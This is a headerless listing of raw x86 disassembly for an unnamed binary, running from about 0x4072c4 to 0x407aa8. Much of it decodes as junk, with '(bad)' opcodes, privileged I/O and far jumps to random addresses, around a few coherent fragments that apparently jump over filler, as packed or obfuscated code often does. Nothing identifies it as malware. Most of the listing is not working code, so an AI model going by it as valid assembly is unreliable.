  4072c4:	xchg   edx,eax
  4072c5:	dec    ecx
  4072c6:	fwait
  4072c7:	cmc    
  4072c8:	inc    eax
  4072c9:	xchg   ebp,eax
  4072ca:	aas    
  4072cb:	std    
  4072cc:	sar    BYTE PTR [ecx-0x69f9a1da],cl
  4072d2:	(bad)  
  4072d3:	fldcw  WORD PTR [ecx-0x2]
  4072d6:	in     al,dx
  4072d7:	cmp    DWORD PTR [ebx],ebp
  4072d9:	or     al,0x82
  4072db:	nop
  4072dc:	jmp    FWORD PTR [ebx]
  4072de:	xchg   ebp,eax
  4072df:	push   0xffffff9d
  4072e1:	jecxz  0x407338
  4072e3:	cld    
  4072e4:	std    
  4072e5:	sbb    eax,0xc3e716cd
  4072ea:	ror    BYTE PTR [edi+0x29acfd6],1
  4072f0:	(bad)  
  4072f1:	xchg   ecx,eax
  4072f2:	add    DWORD PTR [ebx+eax*1-0x7c],ebp
  4072f6:	cmp    eax,0xa4a89f66
  4072fb:	ins    DWORD PTR es:[edi],dx
  4072fc:	push   edx
  4072fd:	push   edi
  4072fe:	cdq    
  4072ff:	push   edx
  407300:	dec    edi
  407301:	adc    al,0x82
  407303:	stc    
  407304:	add    DWORD PTR [ebp-0x1e],0x51570dd5
  40730b:	jl     0x4072e9
  40730d:	fwait
  40730e:	ret    0x636f
  407311:	retf   
  407312:	jmp    0x4072e8
  407314:	mov    al,ds:0x81f8458b
  407319:	loope  0x40730a
  40731b:	add    BYTE PTR [bx+si],al
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430546
  40732a:	sub    DWORD PTR ds:0x43049a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e762,0x4304aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4304b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi+0x4c02235c]
  40736c:	mov    dh,0xfe
  40736e:	push   ebx
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x40736d
  407378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407379:	test   BYTE PTR [ebp+0x28],dl
  40737c:	bswap  ebx
  40737e:	xchg   esp,eax
  40737f:	dec    BYTE PTR [edx+eax*4+0x1e612f11]
  407386:	je     0x407390
  407388:	and    esi,DWORD PTR ds:0x1621498c
  40738f:	stc    
  407390:	or     dl,cl
  407392:	outs   dx,BYTE PTR ds:[esi]
  407393:	sbb    al,0x41
  407395:	sub    al,0x4e
  407397:	mov    ss,WORD PTR [eax-0x7a]
  40739a:	mov    ecx,0x88456211
  40739f:	push   0xffffff86
  4073a1:	ret    0xb326
  4073a4:	cmp    esi,DWORD PTR [edx-0x50]
  4073a7:	xchg   ebp,eax
  4073a8:	push   ebx
  4073a9:	dec    edx
  4073aa:	in     al,dx
  4073ab:	mov    dh,0x3e
  4073ad:	nop
  4073ae:	xchg   BYTE PTR [esp+ebp*2+0x3f430da2],dh
  4073b5:	(bad)  
  4073b6:	out    dx,eax
  4073b7:	jae    0x4073c9
  4073b9:	iret   
  4073ba:	mov    dl,0x8a
  4073bc:	nop
  4073bd:	push   0x3c96be1c
  4073c2:	adc    eax,DWORD PTR [ecx+edi*1+0x68]
  4073c6:	jecxz  0x407383
  4073c8:	lea    edx,[ebx+0x9]
  4073cb:	call   0xc434:0xa7e6d40
  4073d2:	pop    ecx
  4073d3:	mov    al,0x31
  4073d5:	push   esi
  4073d6:	xchg   esp,eax
  4073d7:	xlat   BYTE PTR ds:[ebx]
  4073d8:	jne    0x40741e
  4073da:	repz mov dh,0xe7
  4073dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073de:	test   eax,0x6c9716ab
  4073e3:	cmp    cl,BYTE PTR [esi-0x58b24b8]
  4073e9:	test   eax,0x934b7a08
  4073ee:	add    ah,BYTE PTR [edi+eiz*8-0x5]
  4073f2:	stos   BYTE PTR es:[edi],al
  4073f3:	dec    ecx
  4073f4:	cmp    dh,BYTE PTR [esi]
  4073f6:	rol    DWORD PTR [edi-0x4c568608],cl
  4073fc:	mov    dl,0x38
  4073fe:	mov    esp,0x8dbb877c
  407403:	sub    dh,BYTE PTR [ebp-0x13]
  407406:	xrstor [esi]
  407409:	mov    esi,0x4b2ded1
  40740e:	add    BYTE PTR [ebx+ebx*4+0x2d5ac3b5],0x7a
  407416:	std    
  407417:	xchg   ecx,eax
  407418:	dec    ebp
  407419:	cmp    dh,BYTE PTR [esi-0x768636b8]
  40741f:	addr16 pop eax
  407421:	sbb    DWORD PTR ds:0x18aef420,edx
  407427:	sub    BYTE PTR [edx+0x6c13135b],bh
  40742d:	pop    es
  40742e:	stos   BYTE PTR es:[edi],al
  40742f:	xor    BYTE PTR [ebx],ah
  407431:	pop    es
  407432:	adc    DWORD PTR [edx+0x6bfb7e08],0x65
  407439:	(bad)  
  40743a:	retf   0xc549
  40743d:	xchg   esi,eax
  40743e:	ins    DWORD PTR es:[edi],dx
  40743f:	stos   BYTE PTR es:[edi],al
  407440:	jae    0x40745b
  407442:	repnz xchg ebp,eax
  407444:	(bad)  
  407445:	lea    esp,[eax]
  407447:	fadd   QWORD PTR [edi+0xc]
  40744a:	lock lods al,BYTE PTR ds:[esi]
  40744c:	and    esp,DWORD PTR [ecx-0x31]
  40744f:	call   0x1522e73
  407454:	cmp    ah,BYTE PTR [esi]
  407456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407457:	jno    0x407440
  407459:	das    
  40745a:	cmp    eax,0x9fc34308
  40745f:	pop    ds
  407460:	sti    
  407461:	sti    
  407462:	push   ebx
  407463:	sar    dh,cl
  407465:	sti    
  407466:	mov    ebx,DWORD PTR [edi]
  407468:	jo     0x40744a
  40746a:	push   eax
  40746b:	sti    
  40746c:	(bad)  
  40746d:	sub    al,0x34
  40746f:	ss pop ss
  407471:	adc    eax,0x9026b9a6
  407476:	sar    DWORD PTR [edx-0x6],cl
  407479:	mov    cl,0x53
  40747b:	repnz push ecx
  40747d:	clc    
  40747e:	xor    cl,dl
  407480:	adc    DWORD PTR [edx-0x24],esp
  407483:	dec    esp
  407484:	and    esp,DWORD PTR [edi-0x7d]
  407487:	ret    0x6c65
  40748a:	data16 fadd DWORD PTR [edx-0xdd52708]
  407491:	mov    DWORD PTR [eax],esi
  407493:	ror    DWORD PTR [edi+0x54],cl
  407496:	repnz test al,0xd6
  407499:	aas    
  40749a:	sub    eax,0x9255443
  4074a0:	repz sbb eax,0x8e4bd3b9
  4074a6:	dec    ebx
  4074a7:	popf   
  4074a8:	or     ah,BYTE PTR [ebp-0x67268537]
  4074ae:	in     eax,0xe8
  4074b0:	pop    eax
  4074b1:	sub    DWORD PTR [edi],0xa
  4074b4:	sub    DWORD PTR [edi+edi*8],edx
  4074b7:	loop   0x407475
  4074b9:	lds    eax,FWORD PTR [ebp+edi*8-0x2f4d7dbe]
  4074c0:	xchg   BYTE PTR [ebx+eax*8],dl
  4074c3:	inc    ecx
  4074c4:	inc    esi
  4074c5:	imul   ebp,DWORD PTR [ebp-0x66],0x5dda67d6
  4074cc:	nop
  4074cd:	xchg   DWORD PTR [esi+0x2f],ecx
  4074d0:	in     al,dx
  4074d1:	mov    dl,0x47
  4074d3:	test   eax,0xa18eba9
  4074d8:	sbb    ecx,eax
  4074da:	mov    bh,0x83
  4074dc:	clc    
  4074dd:	inc    eax
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	sbb    ch,BYTE PTR [ecx-0x2c]
  40750c:	adc    ebp,ebp
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x4074b7
  407516:	cmp    BYTE PTR [edx+0x44d48dfe],0x27
  40751d:	mov    bl,0x53
  40751f:	jge    0x407558
  407521:	xchg   edx,eax
  407522:	shr    dl,cl
  407524:	pusha  
  407525:	(bad)  
  407526:	mov    al,0x4c
  407528:	mov    eax,ebx
  40752a:	jnp    0x407594
  40752c:	push   edi
  40752d:	dec    eax
  40752e:	lods   al,BYTE PTR ds:[esi]
  40752f:	xor    eax,DWORD PTR [esi+0x4d394d7c]
  407535:	lea    esi,[eax+0x54]
  407538:	in     eax,0xaa
  40753a:	int3   
  40753b:	mov    esp,0x518a11
  407540:	mov    esp,0x18b44f1
  407545:	xor    BYTE PTR [ecx],al
  407547:	dec    edi
  407548:	ret    
  407549:	pop    ds
  40754a:	test   al,0x84
  40754c:	pop    esi
  40754d:	test   eax,0xb14e895e
  407552:	adc    al,0x2a
  407554:	sub    DWORD PTR [edx+0x97e1180],esp
  40755a:	jb     0x40756a
  40755c:	cld    
  40755d:	cmp    esi,0x44f61075
  407563:	iret   
  407564:	mov    esp,0xe019d76c
  407569:	mov    ds:0x753dd885,al
  40756e:	add    DWORD PTR [ebx+0x7f622e50],esp
  407574:	xor    dl,dh
  407576:	int3   
  407577:	sbb    eax,0x30669d5
  40757c:	pop    edx
  40757d:	push   ebp
  40757e:	push   ebp
  40757f:	in     al,dx
  407580:	ror    BYTE PTR [eax+0x5d4d6a6e],cl
  407586:	ins    DWORD PTR es:[edi],dx
  407587:	mov    ds,WORD PTR gs:[ebp-0x41]
  40758b:	js     0x407607
  40758d:	mov    bl,0x1f
  40758f:	(bad)  
  407590:	aam    0xee
  407592:	mov    ah,0x68
  407594:	fild   QWORD PTR [ebp+0x21]
  407597:	pop    esi
  407598:	jle    0x40755f
  40759a:	xlat   BYTE PTR cs:[ebx]
  40759c:	push   esp
  40759d:	adc    al,0x18
  40759f:	retf   
  4075a0:	(bad)  
  4075a1:	or     esp,DWORD PTR [esi+0x7e08b5f5]
  4075a7:	sub    BYTE PTR [eax-0x350a8c1b],dl
  4075ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ae:	enter  0x6da1,0x82
  4075b2:	xlat   BYTE PTR ds:[ebx]
  4075b3:	push   edx
  4075b4:	push   0x1c
  4075b6:	fistp  WORD PTR [ecx-0x1]
  4075b9:	xchg   ecx,eax
  4075ba:	cli    
  4075bb:	mov    DWORD PTR [ebp+0x4],ecx
  4075be:	sti    
  4075bf:	not    BYTE PTR [eax]
  4075c1:	aad    0xd5
  4075c3:	paddw  mm2,mm1
  4075c6:	fist   DWORD PTR [esi+0x13]
  4075c9:	push   esi
  4075ca:	sub    al,0xac
  4075cc:	aaa    
  4075cd:	rol    BYTE PTR [ebx+0x66],1
  4075d0:	and    bh,BYTE PTR [ebx-0x5b]
  4075d3:	lods   al,BYTE PTR ds:[esi]
  4075d4:	(bad)  
  4075d5:	das    
  4075d6:	cmp    ebx,DWORD PTR [ecx+0x20]
  4075d9:	sub    eax,0x531ffdf6
  4075de:	push   eax
  4075df:	aas    
  4075e0:	mov    edx,0xd76f95b5
  4075e5:	inc    ebx
  4075e6:	cli    
  4075e7:	add    ebp,DWORD PTR [eax+0x2d]
  4075ea:	xor    esi,esi
  4075ec:	and    eax,DWORD PTR [ebx-0x10]
  4075ef:	adc    esi,DWORD PTR [ebp+0x0]
  4075f2:	lea    esi,[esi-0x29]
  4075f5:	arpl   ax,cx
  4075f7:	das    
  4075f8:	cmp    DWORD PTR [ebx+0x4ce5b689],esp
  4075fe:	pop    edx
  4075ff:	and    DWORD PTR [ebx-0x68f71d9d],0xffffffe9
  407606:	frstor [edx+0x5bf9be7e]
  40760c:	ins    DWORD PTR es:[edi],dx
  40760d:	add    dl,dh
  40760f:	xchg   ebp,eax
  407610:	scas   eax,DWORD PTR es:[edi]
  407611:	xlat   BYTE PTR ds:[ebx]
  407612:	lea    eax,[ecx-0x36]
  407615:	pop    es
  407616:	cmp    ebp,ebp
  407618:	stos   BYTE PTR es:[edi],al
  407619:	pop    ds
  40761a:	inc    esi
  40761b:	xor    eax,0x13744799
  407620:	jno    0x407606
  407622:	xor    al,BYTE PTR [eax+0x3681b8dc]
  407628:	push   0x1d
  40762a:	and    DWORD PTR ds:0x50c66fcd,ecx
  407630:	jmp    0xb44eaeb3
  407635:	xchg   edi,eax
  407636:	jp     0x407653
  407638:	sub    DWORD PTR [edx],esp
  40763a:	inc    edx
  40763b:	pop    ds
  40763c:	sahf   
  40763d:	mov    ah,0xe
  40763f:	inc    edx
  407640:	cmp    eax,0x295ab573
  407645:	mov    DWORD PTR [ecx+0x51],ecx
  407648:	icebp  
  407649:	inc    edx
  40764b:	hlt    
  40764c:	sbb    esi,DWORD PTR [esi+0x50]
  40764f:	es imul edx,esp,0x593dcf
  407656:	loope  0x4076c7
  407658:	jns    0x407669
  40765a:	mov    edx,0x4e99eb19
  40765f:	and    ah,BYTE PTR [ebx+edi*8+0x4f]
  407663:	fdivr  QWORD PTR [eax+0x26]
  407666:	hlt    
  407667:	dec    esp
  407668:	mov    edi,0x3757cf26
  40766d:	icebp  
  40766e:	cld    
  40766f:	sbb    cl,cl
  407671:	mov    ?,WORD PTR [edx]
  407673:	scas   al,BYTE PTR es:[edi]
  407674:	mov    ebx,0xe5dccf6
  407679:	mov    edi,DWORD PTR [ebp+0x8]
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	lock std 
  40768f:	and    al,0x86
  407691:	inc    ecx
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x40770e
  40769a:	std    
  40769b:	fidivr WORD PTR [ecx]
  40769d:	outs   dx,BYTE PTR ds:[esi]
  40769e:	adc    ah,BYTE PTR [edi+ebp*4]
  4076a1:	push   es
  4076a2:	stos   DWORD PTR es:[edi],eax
  4076a3:	sbb    edi,DWORD PTR [esi]
  4076a5:	mov    ebx,0x4ee252df
  4076aa:	push   ds
  4076ab:	and    BYTE PTR [ecx],dl
  4076ad:	cdq    
  4076ae:	(bad)  
  4076af:	test   BYTE PTR ds:[eax+0x763db3b7],ch
  4076b6:	aaa    
  4076b7:	push   esp
  4076b8:	imul   edx,DWORD PTR [ecx-0x987fe35],0xbd22da6c
  4076c2:	pusha  
  4076c3:	mov    ?,WORD PTR [esi]
  4076c5:	loop   0x40769a
  4076c7:	dec    esi
  4076c8:	push   edx
  4076c9:	push   ds
  4076ca:	xor    eax,0xdadfa78c
  4076cf:	imul   edi,ecx,0xffffffd0
  4076d2:	and    DWORD PTR [esi-0x43915023],esi
  4076d8:	push   es
  4076d9:	rol    BYTE PTR [ebx+0x9],1
  4076dc:	push   ecx
  4076dd:	outs   dx,BYTE PTR ds:[esi]
  4076de:	push   esi
  4076df:	inc    edi
  4076e0:	inc    ebx
  4076e1:	mov    ebp,0xdfed5ab4
  4076e6:	aas    
  4076e7:	les    ebp,FWORD PTR [ebx-0x25]
  4076ea:	std    
  4076eb:	jl     0x4076c5
  4076ed:	xchg   ecx,ecx
  4076ef:	jmp    0x90d9a56f
  4076f4:	cdq    
  4076f5:	call   0x5bad93a6
  4076fa:	inc    esi
  4076fb:	retf   0x6849
  4076fe:	mov    edi,0x54c21279
  407703:	lock ret 0x57d6
  407707:	xor    BYTE PTR [ecx],ah
  407709:	pop    eax
  40770a:	inc    ebx
  40770b:	xor    eax,0x35c20954
  407710:	repz shl BYTE PTR gs:[ebx],1
  407714:	lods   eax,DWORD PTR ds:[esi]
  407715:	push   eax
  407716:	mov    esp,0x72761f7
  40771b:	inc    ecx
  40771c:	stc    
  40771d:	cmc    
  40771e:	popa   
  40771f:	mov    cl,0x38
  407721:	push   es
  407722:	or     DWORD PTR [ebx],edx
  407724:	scas   al,BYTE PTR es:[edi]
  407725:	stos   DWORD PTR es:[edi],eax
  407726:	mov    esi,DWORD PTR [esi+0x1a]
  407729:	or     BYTE PTR [edx-0x3c],0x23
  40772d:	push   ebx
  40772e:	mov    DWORD PTR [esi],esp
  407730:	pop    edx
  407731:	jae    0x407702
  407733:	adc    eax,0xdb1f4197
  407738:	jle    0x4077b5
  40773a:	into   
  40773b:	outs   dx,DWORD PTR ds:[esi]
  40773c:	mov    esp,0x7f701815
  407741:	cs jb  0x407709
  407744:	push   esp
  407745:	in     al,dx
  407746:	dec    ecx
  407747:	and    BYTE PTR [ecx+0x2a],0x39
  40774b:	cld    
  40774c:	std    
  40774d:	in     eax,0x5a
  40774f:	inc    ebp
  407750:	fldenv [ecx]
  407752:	int    0xb
  407754:	mov    ch,BYTE PTR [edx-0x60]
  407757:	fnstenv ds:0x33a9e597
  40775d:	push   esp
  40775e:	pop    edx
  40775f:	setno  BYTE PTR [esi-0x33e9043]
  407766:	lods   eax,DWORD PTR ds:[esi]
  407767:	xchg   esp,eax
  407768:	stos   BYTE PTR es:[edi],al
  407769:	int    0xe4
  40776b:	inc    ebp
  40776c:	cli    
  40776d:	arpl   WORD PTR [ebx+0x74],sp
  407770:	or     esi,edx
  407772:	xchg   bl,dh
  407774:	sahf   
  407775:	test   al,0xdf
  407777:	cmp    al,0x36
  407779:	loopne 0x4077f8
  40777b:	iret   
  40777c:	add    dl,BYTE PTR [ebx-0x439a24a6]
  407782:	cmp    eax,0x9ca227a0
  407787:	clc    
  407788:	std    
  407789:	mov    edx,0x55b16c7e
  40778e:	xchg   DWORD PTR [edx],edx
  407790:	call   0x18c1:0x4befa95b
  407797:	rcl    DWORD PTR [eax+0x53],cl
  40779a:	fdivp  st(6),st
  40779c:	or     DWORD PTR [ecx+0x7a177ba],esp
  4077a2:	cld    
  4077a3:	adc    DWORD PTR [ecx+0x45b05bf5],edx
  4077a9:	fidiv  DWORD PTR [ebx+0x59e4c42a]
  4077af:	aad    0x3a
  4077b1:	sub    bh,cl
  4077b3:	xchg   esp,eax
  4077b4:	out    0x7e,eax
  4077b6:	lds    eax,FWORD PTR [eax]
  4077b8:	adc    BYTE PTR [esi],bh
  4077ba:	cmp    eax,0xf9096c7d
  4077bf:	ds in  eax,0xac
  4077c2:	or     eax,DWORD PTR [esi]
  4077c4:	scas   eax,DWORD PTR es:[edi]
  4077c5:	jg     0x4077ec
  4077c7:	shr    BYTE PTR [ebp-0x132848aa],1
  4077cd:	loope  0x4077fa
  4077cf:	fnstsw WORD PTR [edx]
  4077d1:	iret   
  4077d2:	xor    eax,0x70c232ca
  4077d7:	int    0x9
  4077d9:	xor    ebx,DWORD PTR [esi+ebx*4-0x7b]
  4077dd:	inc    ebx
  4077de:	push   esp
  4077df:	aaa    
  4077e0:	sbb    edx,DWORD PTR [edx-0x19a72e4d]
  4077e6:	jge    0x407795
  4077e8:	repz dec ebx
  4077ea:	inc    ecx
  4077eb:	jmp    0x18c27223
  4077f0:	push   0x567b78af
  4077f5:	dec    ebp
  4077f6:	or     eax,0xbb832d4
  4077fb:	enter  0xb80c,0x40
  4077ff:	mov    al,BYTE PTR [eax]
  407801:	add    BYTE PTR [esi+0x33],ah
  407804:	inc    esp
  407805:	xchg   edi,eax
  407806:	add    bh,BYTE PTR [edi+0x3b06]
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	nop    ecx
  407823:	and    BYTE PTR ds:0xd27e7ec3,0x7f
  40782a:	jle    0x4078aa
  40782c:	jno    0x407814
  40782e:	in     al,0x36
  407830:	adc    eax,0xc46c054c
  407835:	push   edi
  407836:	je     0x4078af
  407838:	cmc    
  407839:	aad    0xf0
  40783b:	xchg   ecx,eax
  40783c:	icebp  
  40783d:	inc    esp
  40783e:	xchg   edx,eax
  40783f:	mov    eax,ds:0x701e88fa
  407844:	and    BYTE PTR [esp+edx*1-0x58],ch
  407848:	and    eax,0xb37d0845
  40784d:	enter  0xe0a4,0xa5
  407851:	add    eax,0x42be8097
  407856:	cmp    BYTE PTR [ebx],dh
  407858:	shl    DWORD PTR [edi],cl
  40785a:	rol    BYTE PTR [esi],1
  40785c:	push   ds
  40785d:	(bad)  
  40785e:	dec    ebx
  40785f:	push   edx
  407860:	js     0x4078a9
  407862:	hlt    
  407863:	ins    BYTE PTR es:[edi],dx
  407864:	adc    ch,BYTE PTR [esi]
  407866:	(bad)  
  407867:	pop    ebp
  407868:	and    eax,0x33b1a54c
  40786d:	(bad)  
  40786e:	sub    bl,BYTE PTR [eax]
  407870:	outs   dx,DWORD PTR ds:[esi]
  407871:	test   eax,0xa67f4c7c
  407876:	retf   
  407877:	mov    dh,0xc2
  407879:	pusha  
  40787a:	hlt    
  40787b:	fild   QWORD PTR [edi-0x1f9e8d06]
  407881:	test   cl,0x1d
  407884:	sbb    eax,DWORD PTR [ebp+0x38]
  407887:	cmp    eax,DWORD PTR [edi-0x6]
  40788a:	iret   
  40788b:	shl    BYTE PTR [edx+ebx*8-0x5d],0x71
  407890:	out    dx,eax
  407891:	dec    ebp
  407892:	test   DWORD PTR [ebx],esi
  407894:	sub    al,0x50
  407896:	aad    0xe
  407898:	test   eax,0x55652dc0
  40789d:	or     BYTE PTR [edx],0x26
  4078a0:	add    al,0xea
  4078a2:	dec    esi
  4078a3:	cli    
  4078a4:	push   esi
  4078a5:	in     al,0x38
  4078a7:	stos   DWORD PTR es:[edi],eax
  4078a8:	dec    edi
  4078a9:	jle    0x407861
  4078ab:	pop    edi
  4078ac:	push   cs
  4078ad:	xlat   BYTE PTR ds:[ebx]
  4078ae:	arpl   WORD PTR [edi],ax
  4078b0:	rol    DWORD PTR [edi-0x53b84368],cl
  4078b6:	pop    es
  4078b7:	(bad)  
  4078b9:	mov    al,0x74
  4078bb:	rol    DWORD PTR [edi-0x5665f35f],0x39
  4078c2:	rcl    DWORD PTR [edx-0x49af74b9],cl
  4078c8:	sbb    eax,0xf5a092d3
  4078cd:	add    al,0x62
  4078cf:	fdiv   st(0),st
  4078d1:	aad    0x10
  4078d3:	cmc    
  4078d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078d5:	retf   0xca62
  4078d8:	dec    ebp
  4078d9:	sub    dh,BYTE PTR [edx+0x7ce1b98d]
  4078df:	mov    ah,0xce
  4078e1:	outs   dx,BYTE PTR ds:[esi]
  4078e2:	adc    eax,0xd7b38bca
  4078e7:	xchg   edx,eax
  4078e8:	test   BYTE PTR [eax+0x3a],0xf2
  4078ec:	mov    eax,0x167b629d
  4078f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f2:	scas   al,BYTE PTR es:[edi]
  4078f3:	mov    dl,0x91
  4078f5:	jl     0x40792b
  4078f7:	std    
  4078f8:	pop    ebp
  4078f9:	jle    0x407956
  4078fb:	pop    ds
  4078fc:	xchg   ecx,eax
  4078fd:	pop    eax
  4078fe:	imul   eax,DWORD PTR [ebx+0x31],0x34e3946
  407905:	sbb    BYTE PTR [edx+0x6f],0xd1
  407909:	(bad)  
  40790a:	(bad)  
  40790b:	sub    edi,DWORD PTR ds:0xafaf5e5b
  407911:	jmp    0x40798f
  407913:	das    
  407914:	out    dx,ax
  407916:	xchg   edi,eax
  407917:	icebp  
  407918:	pop    ebp
  407919:	cmp    al,0xaa
  40791b:	push   edx
  40791c:	popa   
  40791d:	imul   ecx,DWORD PTR [esi],0xffffffb1
  407920:	sbb    al,BYTE PTR ds:0x3b7ad5fe
  407926:	or     ecx,DWORD PTR [edi+0x5a]
  407929:	inc    eax
  40792a:	lea    ecx,[ecx]
  40792c:	shr    DWORD PTR [esi-0x13],cl
  40792f:	in     eax,0xf0
  407931:	dec    esp
  407932:	stos   BYTE PTR es:[edi],al
  407933:	cmp    ebx,DWORD PTR [eax+ebp*1+0x30f90023]
  40793a:	dec    ebx
  40793b:	cmp    BYTE PTR [edx-0x2dd9ee4],0xd5
  407942:	enter  0x6908,0x1a
  407946:	xor    DWORD PTR ss:[esi+0x2c],edx
  40794a:	mov    DWORD PTR [ecx],eax
  40794c:	dec    ecx
  40794d:	push   ss
  40794e:	lds    esi,FWORD PTR [edx]
  407950:	inc    edx
  407951:	fist   DWORD PTR [ebp+0x8]
  407954:	jbe    0x4078fd
  407956:	mov    ecx,0x4c762ec1
  40795b:	jb     0x4078fd
  40795d:	and    DWORD PTR [esi-0x39e6c065],edx
  407963:	sar    BYTE PTR [edi+0x23],1
  407966:	mov    edi,0xead5f557
  40796b:	out    dx,eax
  40796c:	in     al,dx
  40796d:	fdivrp st(5),st
  40796f:	dec    esi
  407970:	loope  0x4079e0
  407972:	fwait
  407973:	jno    0x40796b
  407975:	jmp    0x4079a3
  407977:	xchg   edx,eax
  407978:	or     eax,0x6fbf606a
  40797d:	pushf  
  40797e:	and    ebp,DWORD PTR ds:0x4e3cd0a4
  407984:	inc    ecx
  407985:	retf   0x681e
  407988:	xchg   ecx,eax
  407989:	pop    es
  40798a:	mov    dh,0xb5
  40798c:	push   ebp
  40798d:	popa   
  40798e:	sbb    al,BYTE PTR [edx]
  407990:	movzx  eax,ax
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	xchg   DWORD PTR [ebx-0x1d],ecx
  4079aa:	inc    edx
  4079ab:	cdq    
  4079ac:	les    edi,FWORD PTR [esi+0x7e]
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x407a2e
  4079b4:	sub    edx,ecx
  4079b6:	mov    bh,0x30
  4079b8:	das    
  4079b9:	lea    edi,[ebx+eiz*8-0x3f]
  4079bd:	ja     0x4079a8
  4079bf:	xchg   esi,eax
  4079c0:	cmp    eax,0x5eb39381
  4079c5:	daa    
  4079c6:	shl    DWORD PTR [ecx-0x35],1
  4079c9:	mov    edi,0xe4d525a4
  4079ce:	xchg   ebp,eax
  4079cf:	sbb    bh,BYTE PTR cs:[edi]
  4079d2:	scas   al,BYTE PTR es:[edi]
  4079d3:	xchg   DWORD PTR [edi-0x7ead0aa0],edx
  4079d9:	sti    
  4079da:	gs or  eax,0x830a73f8
  4079e0:	or     ah,BYTE PTR [esi-0x2d]
  4079e3:	pusha  
  4079e4:	bound  edi,QWORD PTR [edx-0x1295d7c4]
  4079ea:	into   
  4079eb:	rcr    esi,0x98
  4079ee:	jne    0x40797b
  4079f0:	aad    0x2
  4079f2:	add    eax,0x9193354f
  4079f7:	push   cs
  4079f8:	pop    edx
  4079f9:	push   0x94e42f77
  4079fe:	xor    eax,0xcc90d9de
  407a03:	sub    BYTE PTR [edi+0x5fd7d048],0x4d
  407a0a:	ret    0xdd8b
  407a0d:	jne    0x40799b
  407a0f:	push   ebx
  407a10:	mov    edx,0x701901e8
  407a15:	mov    ebx,0x3a9584d3
  407a1a:	aam    0x3f
  407a1c:	adc    al,ah
  407a1e:	xchg   ebp,eax
  407a1f:	int3   
  407a20:	push   ebp
  407a21:	pop    edx
  407a22:	sbb    BYTE PTR [eax+0x75],bl
  407a25:	mov    edi,0x2f05576
  407a2a:	sar    DWORD PTR [ebx-0x2935c544],0xeb
  407a31:	or     ecx,0x80bb7124
  407a37:	jle    0x407a90
  407a39:	xor    BYTE PTR [ecx+0x6f22987],ch
  407a3f:	shl    DWORD PTR [eax],cl
  407a41:	mov    ?,WORD PTR [esi+0x35ae5473]
  407a47:	loop   0x407aa7
  407a49:	mov    DWORD PTR [ebp+0x5],eax
  407a4c:	adc    DWORD PTR [ecx+esi*1+0x4c4a85ab],esi
  407a53:	in     al,0x2f
  407a55:	aad    0xb4
  407a57:	add    eax,0xac4b1b3c
  407a5c:	(bad)  
  407a5d:	retf   
  407a5e:	loopne 0x407a46
  407a60:	pop    edi
  407a61:	mov    gs,WORD PTR [esi-0x64fd5bdb]
  407a67:	jmp    0x4af6d66b
  407a6c:	imul   edx,DWORD PTR [ecx+ebp*2],0x69
  407a70:	fsubp  st(5),st
  407a72:	sub    bh,BYTE PTR [ebx]
  407a74:	sub    BYTE PTR [edi+0x29],dh
  407a77:	js     0x407a6b
  407a79:	mov    eax,0xef4b7d3b
  407a7e:	jnp    0x407aa8
  407a80:	mov    BYTE PTR [ebp-0x4c],dl
  407a83:	pop    ecx
  407a84:	test   eax,0x94534313
  407a89:	add    dh,BYTE PTR [ebp-0x27]
  407a8c:	sub    ah,BYTE PTR [esi-0x1e]
  407a8f:	pop    edi
  407a90:	jno    0x407a93
  407a92:	jno    0x407a5e
  407a94:	out    dx,al
  407a95:	out    0xbd,eax
  407a97:	pop    ds
  407a98:	daa    
  407a99:	jl     0x407a4d
  407a9b:	ss aam 0xef
  407a9e:	rcr    BYTE PTR [ebx+0x17],1
  407aa1:	imul   ecx,DWORD PTR [ecx+0x7aa111af],0xffffffaa
  407aa8:	mov    esi,0x643363f2
